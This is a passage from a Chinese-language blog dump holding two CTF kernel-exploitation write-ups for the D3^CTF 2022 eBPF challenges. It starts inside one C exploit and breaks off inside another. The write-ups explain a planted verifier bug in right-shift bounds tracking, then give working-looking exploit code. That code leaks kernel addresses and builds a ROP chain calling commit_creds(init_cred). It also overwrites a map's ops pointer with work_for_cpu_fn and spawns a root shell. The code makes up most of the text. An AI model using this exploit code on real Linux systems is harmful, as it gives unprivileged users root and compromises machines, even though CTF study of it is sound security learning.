BPF_ALU64 | BPF_MOV | BPF_X, \\        .dst_reg = DST,                      \\        .src_reg = SRC,                      \\        .off = 0,                            \\        .imm = 0&#125;)#define BPF_MOV32_REG(DST, SRC)            \\    ((struct bpf_insn)&#123;                    \\        .code = BPF_ALU | BPF_MOV | BPF_X, \\        .dst_reg = DST,                    \\        .src_reg = SRC,                    \\        .off = 0,                          \\        .imm = 0&#125;)/* ALU ops on immediates, bpf_add|sub|...: dst_reg += imm32 */#define BPF_ALU64_IMM(OP, DST, IMM)             \\    ((struct bpf_insn)&#123;                         \\        .code = BPF_ALU64 | BPF_OP(OP) | BPF_K, \\        .dst_reg = DST,                         \\        .src_reg = 0,                           \\        .off = 0,                               \\        .imm = IMM&#125;)/* ALU ops on registers, bpf_add|sub|...: dst_reg += src_reg */#define BPF_ALU64_REG(OP, DST, SRC)             \\    ((struct bpf_insn)&#123;                         \\        .code = BPF_ALU64 | BPF_OP(OP) | BPF_X, \\        .dst_reg = DST,                         \\        .src_reg = SRC,                         \\        .off = 0,                               \\        .imm = 0&#125;)/* Program exit */#define BPF_EXIT_INSN()             \\    ((struct bpf_insn)&#123;             \\        .code = BPF_JMP | BPF_EXIT, \\        .dst_reg = 0,               \\        .src_reg = 0,               \\        .off = 0,                   \\        .imm = 0&#125;)/* BPF_LD_IMM64 macro encodes single &#x27;load 64-bit immediate&#x27; insn */#define BPF_LD_IMM64(DST, IMM) \\    BPF_LD_IMM64_RAW(DST, 0, IMM)/* pseudo BPF_LD_IMM64 insn used to refer to process-local map_fd */#define BPF_LD_MAP_FD(DST, MAP_FD) \\    BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)// varies from userspace bpf_map_info definition so need to redefinestruct bpf_map_info_kernel&#123;    __u32 type;    __u32 id;    __u32 key_size;    __u32 value_size;    __u32 max_entries;    __u32 map_flags;    char name[BPF_OBJ_NAME_LEN];    __u32 ifindex;    __u32 btf_vmlinux_value_type_id;    __u64 netns_dev;    __u64 netns_ino;    __u32 btf_id;    __u32 btf_key_type_id;    __u32 btf_value_type_id;&#125; __attribute__((aligned(8)));#endifint bpf(int cmd, union bpf_attr *attrs)&#123;    return syscall(__NR_bpf, cmd, attrs, sizeof(*attrs));&#125;int create_map(union bpf_attr *map_attrs)&#123;    return bpf(BPF_MAP_CREATE, map_attrs);&#125;int update_map_element(int fd, uint64_t key, void *value, uint64_t flags)&#123;    union bpf_attr attr = &#123;&#125;;    attr.map_fd = fd;    attr.key = (uint64_t)&amp;key;    attr.value = (uint64_t)value;    attr.flags = flags;    return bpf(BPF_MAP_UPDATE_ELEM, &amp;attr);&#125;int lookup_map_element(int fd, uint64_t key, void *value)&#123;    union bpf_attr attr = &#123;&#125;;    attr.map_fd = fd;    attr.key = (uint64_t)&amp;key;    attr.value = (uint64_t)value;    return bpf(BPF_MAP_LOOKUP_ELEM, &amp;attr);&#125;int obj_get_info_by_fd(union bpf_attr *attrs)&#123;    return bpf(BPF_OBJ_GET_INFO_BY_FD, attrs);&#125;int map_get_next_key(union bpf_attr *attrs)&#123;    return bpf(BPF_MAP_GET_NEXT_KEY, attrs);&#125;int run_bpf_prog(struct bpf_insn *insn, uint32_t cnt, int *prog_fd_out, char *write_buf, size_t write_nbytes)&#123;    int ret = -1;    int prog_fd = -1;    char verifier_log_buff[0x200000] = &#123;0&#125;;    int socks[2] = &#123;0&#125;;    union bpf_attr prog_attrs =        &#123;            .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,            .insn_cnt = cnt,            .insns = (uint64_t)insn,            .license = (uint64_t) &quot;&quot;,            .log_level = 2,            .log_size = sizeof(verifier_log_buff),            .log_buf = (uint64_t)verifier_log_buff&#125;;    if (NULL != prog_fd_out)    &#123;        prog_fd = *prog_fd_out;    &#125;    if (0 &gt;= prog_fd)    &#123;        prog_fd = bpf(BPF_PROG_LOAD, &amp;prog_attrs);    &#125;    if (0 &gt; prog_fd)    &#123;        puts(verifier_log_buff);        goto done;    &#125;    if (0 != socketpair(AF_UNIX, SOCK_DGRAM, 0, socks))    &#123;        goto done;    &#125;    if (0 != setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &amp;prog_fd, sizeof(int)))    &#123;        goto done;    &#125;    if (write_nbytes != write(socks[1], write_buf, write_nbytes))    &#123;        printf(&quot;[!] write not so good\\n&quot;);        goto done;    &#125;    if (NULL != prog_fd_out)    &#123;        *prog_fd_out = prog_fd;    &#125;    else    &#123;        close(prog_fd);    &#125;    ret = 0;done:    close(socks[0]);    close(socks[1]);    return ret;&#125;size_t user_cs, user_ss, user_sp, user_rflags;void save_status()&#123;    __asm__(        &quot;mov user_cs, cs;&quot;        &quot;mov user_ss, ss;&quot;        &quot;mov user_sp, rsp;&quot;        &quot;pushf;&quot;        &quot;pop user_rflags;&quot;);    puts(&quot;[*]status has been saved.&quot;);&#125;void err_exit(char *err_msg)&#123;    puts(err_msg);    exit(-1);&#125;void get_shell()&#123;    if (getuid())    &#123;        printf(&quot;\\033[31m\\033[1m[x] Failed to get the root!\\033[0m\\n&quot;);        exit(-1);    &#125;    printf(&quot;\\033[32m\\033[1m[+] Successful to get the root. Execve root shell now...\\033[0m\\n&quot;);    system(&quot;/bin/sh&quot;);&#125;#define EXP_REG BPF_REG_8#define attack()                                    \\    BPF_MOV64_IMM(BPF_REG_9, 64),                   \\        BPF_MOV64_IMM(EXP_REG, 1),                  \\        BPF_ALU64_REG(BPF_RSH, EXP_REG, BPF_REG_9), \\        BPF_MOV64_REG(BPF_REG_0, EXP_REG)int main(int argc, char *argv[])&#123;    if (argc == 1)    &#123;        struct bpf_insn leak_insn[] = &#123;            attack(),            BPF_ALU64_IMM(BPF_MUL, EXP_REG, (16 - 8)),            BPF_MOV64_IMM(BPF_REG_2, 0),            BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),            BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, -8),            BPF_MOV64_IMM(BPF_REG_4, 8),            BPF_ALU64_REG(BPF_ADD, BPF_REG_4, EXP_REG),            BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_skb_load_bytes),            BPF_EXIT_INSN()&#125;;        char buf[0x100];        memset(buf, 0xFF, sizeof(buf));        if (0 != run_bpf_prog(leak_insn, sizeof(leak_insn) / sizeof(struct bpf_insn), NULL, buf, 0x100))        &#123;            err_exit(&quot;[-] Failed to run bpf program\\n&quot;);        &#125;    &#125;    if (argc == 2)    &#123;        save_status();        signal(SIGSEGV, &amp;get_shell);        unsigned long kernel_offset = strtoul(argv[1], NULL, 16);        printf(&quot;[+] kernel offset: %p\\n&quot;, kernel_offset);        unsigned long commit_creds = kernel_offset + 0xffffffff810d7210;        unsigned long init_cred = kernel_offset + 0xffffffff82e6e860;        unsigned long pop_rdi_ret = kernel_offset + 0xffffffff81097050;        unsigned long swapgs_restore_regs_and_return_to_usermode = kernel_offset + 0xffffffff81e0100b;        unsigned long rop_chain[0x100];        int i = 0;        rop_chain[i++] = 0xDEADBEEF;        rop_chain[i++] = 0xDEADBEEF;        rop_chain[i++] = pop_rdi_ret;        rop_chain[i++] = init_cred;        rop_chain[i++] = commit_creds;        rop_chain[i++] = swapgs_restore_regs_and_return_to_usermode;        rop_chain[i++] = 0;        rop_chain[i++] = 0;        rop_chain[i++] = &amp;get_shell;        rop_chain[i++] = user_cs;        rop_chain[i++] = user_rflags;        rop_chain[i++] = user_sp;        rop_chain[i++] = user_ss;        struct bpf_insn attack_insn[] = &#123;            attack(),            BPF_ALU64_IMM(BPF_MUL, EXP_REG, (0x100 - 8)),            BPF_MOV64_IMM(BPF_REG_2, 0),            BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),            BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, -8),            BPF_MOV64_IMM(BPF_REG_4, 8),            BPF_ALU64_REG(BPF_ADD, BPF_REG_4, EXP_REG),            BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_skb_load_bytes),            BPF_EXIT_INSN()&#125;;        if (0 != run_bpf_prog(attack_insn, sizeof(attack_insn) / sizeof(struct bpf_insn), NULL, rop_chain, 0x100))        &#123;            err_exit(&quot;[-] Failed to run bpf program\\n&quot;);        &#125;    &#125;&#125;\n\n\n首先运行exp触发soft panic可以看到在其中存在酷似kernel代码段的地址信息，所以我们可以通过计算得到kernel_offset\n\n\n最后成功提权。\n\n题目放在:https://github.com/196082/196082/blob/main/kernel_pwn/d3bpf-v2.zip\n","categories":["kernel-pwn"],"tags":["ebpf"]},{"title":"d3bpf","url":"/2023/01/06/d3bpf/","content":"虽然在之前出过几篇关于bpf的文章，但是我并没有得到很深层次的理解，文章的exp基本就是copy的。并且，D3^CTF 2022还有两道ebpf需要复现，所以现在就选择了复现一下。\n题目分析diff --git a/fs/fs_context.c b/fs/fs_context.cindex 2834d1afa..0a79c9099 100644--- a/fs/fs_context.c+++ b/fs/fs_context.c@@ -530,7 +530,7 @@ static int legacy_parse_param(struct fs_context *fc, struct fs_parameter *param) \t\t\t      param-&gt;key); \t&#125; -\tif (len &gt; PAGE_SIZE - 2 - size)+\tif (size + len + 2 &gt; PAGE_SIZE) // patch for CVE-2022-0185 \t\treturn invalf(fc, &quot;VFS: Legacy: Cumulative options too large&quot;); \tif (strchr(param-&gt;key, &#x27;,&#x27;) || \t    (param-&gt;type == fs_value_is_string &amp;&amp;diff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.cindex 37581919e..8e98d4af5 100644--- a/kernel/bpf/verifier.c+++ b/kernel/bpf/verifier.c@@ -6455,11 +6455,11 @@ static int adjust_scalar_min_max_vals(struct bpf_verifier_env *env, \t\t\tscalar_min_max_lsh(dst_reg, &amp;src_reg); \t\tbreak; \tcase BPF_RSH:-\t\tif (umax_val &gt;= insn_bitness) &#123;-\t\t\t/* Shifts greater than 31 or 63 are undefined.-\t\t\t * This includes shifts by a negative number.-\t\t\t */-\t\t\tmark_reg_unknown(env, regs, insn-&gt;dst_reg);+\t\tif (umin_val &gt;= insn_bitness) &#123;+\t\t\tif (alu32)+\t\t\t\t__mark_reg32_known(dst_reg, 0);+\t\t\telse+\t\t\t\t__mark_reg_known_zero(dst_reg); \t\t\tbreak; \t\t&#125; \t\tif (alu32)diff --git a/net/packet/af_packet.c b/net/packet/af_packet.cindex 6bbc7a448..d949fdf00 100644--- a/net/packet/af_packet.c+++ b/net/packet/af_packet.c@@ -4448,9 +4448,10 @@ static int packet_set_ring(struct sock *sk, union tpacket_req_u *req_u, \t&#125;  out_free_pg_vec:-\tbitmap_free(rx_owner_map);-\tif (pg_vec)+\tif (pg_vec) &#123;+\t\tbitmap_free(rx_owner_map); // patch for CVE-2021-22600 \t\tfree_pg_vec(pg_vec, order, req-&gt;tp_block_nr);+\t&#125; out: \treturn err; &#125;\n\n题目拿到手之后是一个diff文件，在文件最上面有一个patch是为了修复CVE-2022-0185，在文件的最下面是一个patch，也明说了就是为了修复CVE-2021-22600，不过上面还有一段修改。\n上面将原本的语句删除了，并且添加了几条语句。原本的语句中的，在进行RSH时，如果超过31或则63则将寄存器设置为unkown。但是在修改过后的语句中如果超过了63或者31不是设置为unknown而是默认设置为0。\n这里因为架构的原因，如果我们使用右移64位得到的结果为1\npwndbg&gt; p/x 1 &gt;&gt; 64$3 = 0x1pwndbg&gt;\n\n所以题目这里给的漏洞为，在verifier为0但是在runtime为1的寄存器。\n观察题目的启动命令\nqemu-system-x86_64 \\  -m 128M \\  -kernel bzImage \\  -initrd rootfs.cpio \\  -append &#x27;console=ttyS0 kaslr quiet&#x27; \\  -monitor /dev/null \\  -cpu kvm64,+smep,+smap \\  -smp cores=1,threads=1 \\  -nographic \\  -s\n\n基本上能开的都开了，启动虚拟机也可以查看，其实kpti也是打开了的。\n利用分析泄漏因为我们现在有一个verifier为0，runtime为1的寄存器所以我们可以尝试越界读来造成泄漏，首先就需要认识bpf_map结构体:\nstruct bpf_map &#123;\t/* The first two cachelines with read-mostly members of which some\t * are also accessed in fast-path (e.g. ops, max_entries).\t */\tconst struct bpf_map_ops *ops ____cacheline_aligned;\tstruct bpf_map *inner_map_meta;#ifdef CONFIG_SECURITY\tvoid *security;#endif\tenum bpf_map_type map_type;\tu32 key_size;\tu32 value_size;\tu32 max_entries;\tu32 map_flags;\tint spin_lock_off; /* &gt;=0 valid offset, &lt;0 error */\tu32 id;\tint numa_node;\tu32 btf_key_type_id;\tu32 btf_value_type_id;\tstruct btf *btf;#ifdef CONFIG_MEMCG_KMEM\tstruct mem_cgroup *memcg;#endif\tchar name[BPF_OBJ_NAME_LEN];\tu32 btf_vmlinux_value_type_id;\tbool bypass_spec_v1;\tbool frozen; /* write-once; write-protected by freeze_mutex */\t/* 22 bytes hole */\t/* The 3rd and 4th cacheline with misc members to avoid false sharing\t * particularly with refcounting.\t */\tatomic64_t refcnt ____cacheline_aligned;\tatomic64_t usercnt;\tstruct work_struct work;\tstruct mutex freeze_mutex;\tu64 writecnt; /* writable mmap cnt; protected by freeze_mutex */&#125;;\n\n如果我们在开始定义类型为BPF_MAP_TYPE_ARRAY那么结构体如下:\nstruct bpf_array &#123;\tstruct bpf_map map;\tu32 elem_size;\tu32 index_mask;\tstruct bpf_array_aux *aux;\tunion &#123;\t\tchar value[0] __aligned(8);\t\tvoid *ptrs[0] __aligned(8);\t\tvoid __percpu *pptrs[0] __aligned(8);\t&#125;;&#125;;\n\n可以看到在上面的bpf_map结构体的开始位置有一个ops指针，而根据以往的经验ops中包含了很多内核函数的指针，当然事实也正如此\nconst struct bpf_map_ops array_map_ops = &#123;\t.map_meta_equal = array_map_meta_equal,\t.map_alloc_check = array_map_alloc_check,\t.map_alloc = array_map_alloc,\t.map_free = array_map_free,\t.map_get_next_key = array_map_get_next_key,\t.map_lookup_elem = array_map_lookup_elem,\t.map_update_elem = array_map_update_elem,\t.map_delete_elem = array_map_delete_elem,\t.map_gen_lookup = array_map_gen_lookup,\t.map_direct_value_addr = array_map_direct_value_addr,\t.map_direct_value_meta = array_map_direct_value_meta,\t.map_mmap = array_map_mmap,\t.map_seq_show_elem = array_map_seq_show_elem,\t.map_check_btf = array_map_check_btf,\t.map_lookup_batch = generic_map_lookup_batch,\t.map_update_batch = generic_map_update_batch,\t.map_btf_name = &quot;bpf_array&quot;,\t.map_btf_id = &amp;array_map_btf_id,\t.iter_seq_info = &amp;iter_seq_info,&#125;;\n\n因为我们上面所选择的类型为数组，所以这里ops会包含array_map_ops指针，所以我们可以利用它来泄漏内核地址。\n如果我们使用BPF_FUNC_map_lookup_elem来进行函数调用的话，根据上述ops我们最终会调用到array_map_lookup_elem函数\n/* Called from syscall or from eBPF program */static void *array_map_lookup_elem(struct bpf_map *map, void *key)&#123;\tstruct bpf_array *array = container_of(map, struct bpf_array, map);\tu32 index = *(u32 *)key;\tif (unlikely(index &gt;= array-&gt;map.max_entries))\t\treturn NULL;\treturn array-&gt;value + array-&gt;elem_size * (index &amp; array-&gt;index_mask);&#125;\n\n这里的注释也说明了，这里允许被syscall以及eBPF程序调用。而这里程序的返回内容则是map_ptr.value所以可以根据这里的偏移得出返回内容为map_ptr+0x110的地址。\n可能到这里大家都应该有一定的思路了，不过这里还存在一个检测ALU Sanitation，在这个检测中alu_limit表示操作允许最大值，这里做限制的主要目的是防止通过ebpf程序调用出现越界或访问不属于他自己的地址区域时所做的限制，如果我们src_reg的值大于alu_limit或者与之符号相反，那么src_reg会被强制制为0，导致指针运算失败。不过在这里绕过的方式也比较简单。\nBPF_MOV64_REG(BPF_REG_0, EXP_REG),BPF_ALU64_IMM(BPF_ADD, OOB_REG, 0x1000),BPF_ALU64_IMM(BPF_MUL, BPF_REG_0, 0x1000 - 1),BPF_ALU64_REG(BPF_SUB, OOB_REG, BPF_REG_0),BPF_ALU64_REG(BPF_SUB, OOB_REG, EXP_REG),\n\n因为这里存在一个verifier为0的寄存器EXP_REG那么我们如果进行上述代码中的操作即可是的alm_limit为0x1000\n那么在做完上文中所有操作之后可以正式进入泄漏阶段了，其实有了上述思路，这里泄漏起来就比较简单了\nBPF_ALU64_IMM(BPF_MUL, EXP_REG, 0x110),BPF_ALU64_REG(BPF_SUB, OOB_REG, EXP_REG),BPF_LDX_MEM(BPF_DW, BPF_REG_0, OOB_REG, 0),BPF_STX_MEM(BPF_DW, STORE_REG, BPF_REG_0, 8),BPF_EXIT_INSN(),\n\n只需要将oob_map的array_map_ops放到store_map的value中去即可。并且在bpf_map中存在一个成员work是一个双向链表的结构，其中存在一个地址指向自己，这样我们即可获取oob_map的地址了。\n不过在实际做的过程中会发现上述利用方式会存在许多问题，达不到真正意义上的任意内存读，这里我忘记了具体原因，应该是会检测寄存器的值不能为堆栈以外的地址，所以还需要利用一个新的办法，obj_get_info_by_fd函数:\nstatic int bpf_map_get_info_by_fd(struct file *file,\t\t\t\t  struct bpf_map *map,\t\t\t\t  const union bpf_attr *attr,\t\t\t\t  union bpf_attr __user *uattr)&#123;\tstruct bpf_map_info __user *uinfo = u64_to_user_ptr(attr-&gt;info.info);\tstruct bpf_map_info info;\tu32 info_len = attr-&gt;info.info_len;\tint err;\terr = bpf_check_uarg_tail_zero(uinfo, sizeof(info), info_len);\tif (err)\t\treturn err;\tinfo_len = min_t(u32, sizeof(info), info_len);\tmemset(&amp;info, 0, sizeof(info));\tinfo.type = map-&gt;map_type;\tinfo.id = map-&gt;id;\tinfo.key_size = map-&gt;key_size;\tinfo.value_size = map-&gt;value_size;\tinfo.max_entries = map-&gt;max_entries;\tinfo.map_flags = map-&gt;map_flags;\tmemcpy(info.name, map-&gt;name, sizeof(map-&gt;name));\tif (map-&gt;btf) &#123;\t\tinfo.btf_id = btf_obj_id(map-&gt;btf);\t\tinfo.btf_key_type_id = map-&gt;btf_key_type_id;\t\tinfo.btf_value_type_id = map-&gt;btf_value_type_id;\t&#125;\tinfo.btf_vmlinux_value_type_id = map-&gt;btf_vmlinux_value_type_id;\tif (bpf_map_is_dev_bound(map)) &#123;\t\terr = bpf_map_offload_info_fill(&amp;info, map);\t\tif (err)\t\t\treturn err;\t&#125;\tif (copy_to_user(uinfo, &amp;info, info_len) ||\t    put_user(info_len, &amp;uattr-&gt;info.info_len))\t\treturn -EFAULT;\treturn 0;&#125;\n\nu32 btf_obj_id(const struct btf *btf)&#123;\treturn btf-&gt;id;&#125;\n\n所以如果我们控制bpf_map结构体中的btf即可实现真正意义上的任意地址泄漏。\n提权其实这里的提权方式可能大家都能想到，因为在bpf_map结构体中存在一个结构体为ops，而我们在以往的kernel题目中利用的比较多的就是这个ops，所以这里同样可以这样使用。\n这里选择的最终利用函数是前面提到过的work_for_cpu_fn函数。过程就是，首先我们需要先泄漏出当前ops结构体中的所有函数地址，随后将函数地址中map_get_next_key函数所在位置的指针替换为work_for_cpu_fn，紧接着写入到oob_map的value中去。\nstatic int map_get_next_key(union bpf_attr *attr)&#123;\tvoid __user *ukey = u64_to_user_ptr(attr-&gt;key);\tvoid __user *unext_key = u64_to_user_ptr(attr-&gt;next_key);\tint ufd = attr-&gt;map_fd;\tstruct bpf_map *map;\tvoid *key, *next_key;\tstruct fd f;\tint err;\tif (CHECK_ATTR(BPF_MAP_GET_NEXT_KEY))\t\treturn -EINVAL;\tf = fdget(ufd);\tmap = __bpf_map_get(f);\tif (IS_ERR(map))\t\treturn PTR_ERR(map);\tif (!(map_get_sys_perms(map, f) &amp; FMODE_CAN_READ)) &#123;\t\terr = -EPERM;\t\tgoto err_put;\t&#125;\tif (ukey) &#123;\t\tkey = __bpf_copy_key(ukey, map-&gt;key_size);\t\tif (IS_ERR(key)) &#123;\t\t\terr = PTR_ERR(key);\t\t\tgoto err_put;\t\t&#125;\t&#125; else &#123;\t\tkey = NULL;\t&#125;\terr = -ENOMEM;\tnext_key = kvmalloc(map-&gt;key_size, GFP_USER);\tif (!next_key)\t\tgoto free_key;\tif (bpf_map_is_dev_bound(map)) &#123;\t\terr = bpf_map_offload_get_next_key(map, key, next_key);\t\tgoto out;\t&#125;\trcu_read_lock();\terr = map-&gt;ops-&gt;map_get_next_key(map, key, next_key);\trcu_read_unlock();out:\tif (err)\t\tgoto free_next_key;\terr = -EFAULT;\tif (copy_to_user(unext_key, next_key, map-&gt;key_size) != 0)\t\tgoto free_next_key;\terr = 0;free_next_key:\tkvfree(next_key);free_key:\tkvfree(key);err_put:\tfdput(f);\treturn err;&#125;\n\n这里选择这个函数的很明显，在中途直接调用了ops中的map_get_next_key，并且第一个参数为map。那么这个时候我们如果修改ops为我们的bpf-&gt;value即可调用到work_for_cpu_fn，那么在根据work_for_cpu_fn函数内部调整commit_creds和init_cred即可。\nexp#define _GNU_SOURCE#include &lt;err.h&gt;#include &lt;inttypes.h&gt;#include &lt;sched.h&gt;#include &lt;net/if.h&gt;#include &lt;netinet/in.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/msg.h&gt;#include &lt;sys/socket.h&gt;#include &lt;stdint.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdio.h&gt;#include &lt;linux/userfaultfd.h&gt;#include &lt;pthread.h&gt;#include &lt;errno.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;fcntl.h&gt;#include &lt;signal.h&gt;#include &lt;string.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;sys/sem.h&gt;#include &lt;semaphore.h&gt;#include &lt;poll.h&gt;#include &lt;time.h&gt;#include &lt;linux/bpf_common.h&gt;#include &lt;sys/types.h&gt;#include &lt;linux/bpf.h&gt;#ifndef _BPF_DEFS_H_#define _BPF_DEFS_H_#define BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM) \\    ((struct bpf_insn)&#123;                        \\        .code = CODE,                          \\        .dst_reg = DST,                        \\        .src_reg = SRC,                        \\        .off = OFF,                            \\        .imm = IMM&#125;)#define BPF_LD_IMM64_RAW(DST, SRC, IMM)              \\    ((struct bpf_insn)&#123;                              \\        .code = BPF_LD | BPF_DW | BPF_IMM,           \\        .dst_reg = DST,                              \\        .src_reg = SRC,                              \\        .off = 0,                                    \\        .imm = (__u32)(IMM)&#125;),                       \\        ((struct bpf_insn)&#123;                          \\            .code = 0, /* zero is reserved opcode */ \\            .dst_reg = 0,                            \\            .src_reg = 0,                            \\            .off = 0,                                \\            .imm = ((__u64)(IMM)) &gt;&gt; 32&#125;)/* Memory load, dst_reg = *(uint *) (src_reg + off16) */#define BPF_LDX_MEM(SIZE, DST, SRC, OFF)            \\    ((struct bpf_insn)&#123;                             \\        .code = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM, \\        .dst_reg = DST,                             \\        .src_reg = SRC,                             \\        .off = OFF,                                 \\        .imm = 0&#125;)/* Memory store, *(uint *) (dst_reg + off16) = src_reg */#define BPF_STX_MEM(SIZE, DST, SRC, OFF)            \\    ((struct bpf_insn)&#123;                             \\        .code = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM, \\        .dst_reg = DST,                             \\        .src_reg = SRC,                             \\        .off = OFF,                                 \\        .imm = 0&#125;)/* Conditional jumps against immediates, if (dst_reg &#x27;op&#x27; imm32) goto pc + off16 */#define BPF_JMP_IMM(OP, DST, IMM, OFF)        \\    ((struct bpf_insn)&#123;                       \\        .code = BPF_JMP | BPF_OP(OP) | BPF_K, \\        .dst_reg = DST,                       \\        .src_reg = 0,                         \\        .off = OFF,                           \\        .imm = IMM&#125;)/* Like BPF_JMP_IMM, but with 32-bit wide operands for comparison. */#define BPF_JMP32_IMM(OP, DST, IMM, OFF)        \\    ((struct bpf_insn)&#123;                         \\        .code = BPF_JMP32 | BPF_OP(OP) | BPF_K, \\        .dst_reg = DST,                         \\        .src_reg = 0,                           \\        .off = OFF,                             \\        .imm = IMM&#125;)/* Short form of mov, dst_reg = imm32 */#define BPF_MOV64_IMM(DST, IMM)              \\    ((struct bpf_insn)&#123;                      \\        .code = BPF_ALU64 | BPF_MOV | BPF_K, \\        .dst_reg = DST,                      \\        .src_reg = 0,                        \\        .off = 0,                            \\        .imm = IMM&#125;)#define BPF_MOV32_IMM(DST, IMM)            \\    ((struct bpf_insn)&#123;                    \\        .code = BPF_ALU | BPF_MOV | BPF_K, \\        .dst_reg = DST,                    \\        .src_reg = 0,                      \\        .off = 0,                          \\        .imm = IMM&#125;)/* Short form of mov, dst_reg = src_reg */#define BPF_MOV64_REG(DST, SRC)              \\    ((struct bpf_insn)&#123;                      \\        .code = BPF_ALU64 | BPF_MOV | BPF_X, \\        .dst_reg = DST,                      \\        .src_reg = SRC,                      \\        .off = 0,                            \\        .imm = 0&#125;)#define BPF_MOV32_REG(DST, SRC)            \\    ((struct bpf_insn)&#123;                    \\        .code = BPF_ALU | BPF_MOV | BPF_X, \\        .dst_reg = DST,                    \\        .src_reg = SRC,                    \\        .off = 0,                          \\        .imm = 0&#125;)/* ALU ops on immediates, bpf_add|sub|...: dst_reg += imm32 */#define BPF_ALU64_IMM(OP, DST, IMM)             \\    ((struct bpf_insn)&#123;                         \\        .code = BPF_ALU64 | BPF_OP(OP) | BPF_K, \\        .dst_reg = DST,                         \\        .src_reg = 0,                           \\        .off = 0,                               \\        .imm = IMM&#125;)/* ALU ops on registers, bpf_add|sub|...: dst_reg += src_reg */#define BPF_ALU64_REG(OP, DST, SRC)             \\    ((struct bpf_insn)&#123;                         \\        .code = BPF_ALU64 | BPF_OP(OP) | BPF_X, \\        .dst_reg = DST,                         \\        .src_reg = SRC,                         \\        .off = 0,                               \\        .imm = 0&#125;)/* Program exit */#define BPF_EXIT_INSN()             \\    ((struct bpf_insn)&#123;             \\        .code = BPF_JMP | BPF_EXIT, \\        .dst_reg = 0,               \\        .src_reg = 0,               \\        .off = 0,                   \\        .imm = 0&#125;)/* BPF_LD_IMM64 macro encodes single &#x27;load 64-bit immediate&#x27; insn */#define BPF_LD_IMM64(DST, IMM) \\    BPF_LD_IMM64_RAW(DST, 0, IMM)/* pseudo BPF_LD_IMM64 insn used to refer to process-local map_fd */#define BPF_LD_MAP_FD(DST, MAP_FD) \\    BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)// varies from userspace bpf_map_info definition so need to redefinestruct bpf_map_info_kernel&#123;    __u32 type;    __u32 id;    __u32 key_size;    __u32 value_size;    __u32 max_entries;    __u32 map_flags;    char name[BPF_OBJ_NAME_LEN];    __u32 ifindex;    __u32 btf_vmlinux_value_type_id;    __u64 netns_dev;    __u64 netns_ino;    __u32 btf_id;    __u32 btf_key_type_id;    __u32 btf_value_type_id;&#125; __attribute__((aligned(8)));#endifint bpf(int cmd, union bpf_attr *attrs)&#123;    return syscall(__NR_bpf, cmd, attrs, sizeof(*attrs));&#125;int create_map(union bpf_attr *map_attrs)&#123;    return bpf(BPF_MAP_CREATE, map_attrs);&#125;int update_map_element(int fd, uint64_t key, void *value, uint64_t flags)&#123;    union bpf_attr attr = &#123;&#125;;    attr.map_fd = fd;    attr.key = (uint64_t)&amp;key;    attr.value = (uint64_t)value;    attr.flags = flags;    return bpf(BPF_MAP_UPDATE_ELEM, &amp;attr);&#125;int lookup_map_element(int fd, uint64_t key, void *value)&#123;    union bpf_attr attr = &#123;&#125;;    attr.map_fd = fd;    attr.key = (uint64_t)&amp;key;    attr.value = (uint64_t)value;    return bpf(BPF_MAP_LOOKUP_ELEM, &amp;attr);&#125;int obj_get_info_by_fd(union bpf_attr *attrs)&#123;    return bpf(BPF_OBJ_GET_INFO_BY_FD, attrs);&#125;int map_get_next_key(union bpf_attr *attrs)&#123;    return bpf(BPF_MAP_GET_NEXT_KEY, attrs);&#125;int run_bpf_prog(struct bpf_insn *insn, uint32_t cnt, int *prog_fd_out)&#123;    int ret = -1;    int prog_fd = -1;    char verifier_log_buff[0x200000] = &#123;0&#125;;    int socks[2] = &#123;0&#125;;    union bpf_attr prog_attrs =        &#123;            .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,            .insn_cnt = cnt,            .insns = (uint64_t)insn,            .license = (uint64_t) &quot;&quot;,            .log_level = 2,            .log_size = sizeof(verifier_log_buff),            .log_buf = (uint64_t)verifier_log_buff&#125;;    if (NULL != prog_fd_out)    &#123;        prog_fd = *prog_fd_out;    &#125;    if (0 &gt;= prog_fd)    &#123;        prog_fd = bpf(BPF_PROG_LOAD, &amp;prog_attrs);    &#125;    if (0 &gt; prog_fd)    &#123;        puts(verifier_log_buff);        goto done;    &#125;    if (0 != socketpair(AF_UNIX, SOCK_DGRAM, 0, socks))    &#123;        goto done;    &#125;    if (0 != setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &amp;prog_fd, sizeof(int)))    &#123;        goto done;    &#125;    if (0x7 != write(socks[1], &quot;zzzzzzz&quot;, 7))    &#123;        goto done;    &#125;    if (NULL != prog_fd_out)    &#123;        *prog_fd_out = prog_fd;    &#125;    else    &#123;        close(prog_fd);    &#125;    ret = 0;done:    close(socks[0]);    close(socks[1]);    return ret;&#125;size_t user_cs, user_ss, user_sp, user_rflags;void save_status()&#123;    __asm__(        &quot;mov user_cs, cs;&quot;        &quot;mov user_ss, ss;&quot;        &quot;mov user_sp, rsp;&quot;        &quot;pushf;&quot;        &quot;pop user_rflags;&quot;);    puts(&quot;[*]status has been saved.&quot;);&#125;void err_exit(char *err_msg)&#123;    puts(err_msg);    exit(-1);&#125;void get_shell()&#123;    if (getuid())    &#123;        printf(&quot;\\033[31m\\033[1m[x] Failed to get the root!\\033[0m\\n&quot;);        exit(-1);    &#125;    printf(&quot;\\033[32m\\033[1m[+] Successful to get the root. Execve root shell now...\\033[0m\\n&quot;);    system(&quot;/bin/sh&quot;);&#125;#define EXP_REG 